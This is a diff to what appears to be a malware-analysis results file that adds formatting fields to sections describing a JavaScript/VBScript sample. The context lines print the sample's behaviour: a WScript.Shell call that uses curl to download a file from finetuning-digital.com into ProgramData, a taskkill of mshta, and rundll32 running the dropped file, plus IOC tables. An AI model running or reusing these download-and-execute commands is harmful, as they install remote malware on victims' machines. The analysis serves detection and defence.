@@ -6,6 +6,7 @@
       {
         "auto_collapse": false,
         "body": "Sample uses a combination of both Visual Basic and JavaScript",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -17,6 +18,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"finetuning-digital.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://finetuning-digital.com/wrule/01.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/wrule/01.gif\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 1,
@@ -51,6 +58,7 @@
       {
         "auto_collapse": false,
         "body": null,
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
@@ -62,6 +70,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates an ActiveXObject\n\t\tNew ActiveXObject: WScript.Shell\n\n\t\tActiveXObject(WScript.Shell)\n\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tActiveXObject(wscript.shell)\n\n\t\tActiveXObject(shell.application)\n\n\t\tvar ws = new ActiveXObject('WScript.Shell')",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -84,6 +93,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[14]()\n\n\t\tnew WScript.Shell[16]()\n\n\t\tnew WScript.Shell[18]()\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -106,6 +116,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs dropped executable\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[16].run(\"curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/w...\n\t\tWScript.Shell[18].run(\"taskkill /f /im mshta.exe\", 0)\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -128,6 +139,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs code via shell\n\t\tnew Function(url, function sleep(millis){var date = new Date();var curDate = null;do { curDate = new...\n\t\tWScript.Shell[16].run(\"curl.exe --output C:\\ProgramData\\1.png --url https://finetuning-digital.com/w...\n\t\tWScript.Shell[18].run(\"taskkill /f /im mshta.exe\", 0)\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -150,6 +162,7 @@
       {
         "auto_collapse": false,
         "body": "JavaScript runs code via shell application\n\t\tShell.Application[17].shellexecute(\"rundll32\", \"C:\\ProgramData\\1.png,Wind\", \"\", \"open\", 3)\n",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 1,
@@ -172,6 +185,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"google.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://google.com\"}, {\"ioc_type\": \"domain\", \"ioc\": \"finetuning-digital.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://finetuning-digital.com/wrule/01.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/wrule/01.gif\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -206,6 +225,12 @@
       {
         "auto_collapse": false,
         "body": "[{\"ioc_type\": \"domain\", \"ioc\": \"finetuning-digital.com\"}, {\"ioc_type\": \"uri\", \"ioc\": \"https://finetuning-digital.com/wrule/01.gif\"}, {\"ioc_type\": \"uri_path\", \"ioc\": \"/wrule/01.gif\"}]",
+        "body_config": {
+          "column_order": [
+            "ioc_type",
+            "ioc"
+          ]
+        },
         "body_format": "TABLE",
         "classification": "TLP:C",
         "depth": 0,
@@ -240,6 +265,7 @@
       {
         "auto_collapse": false,
         "body": "\t\tAn encoded literal was found: 1343777b8ead1cef5a79b78a1a48d805",
+        "body_config": {},
         "body_format": "TEXT",
         "classification": "TLP:C",
         "depth": 0,
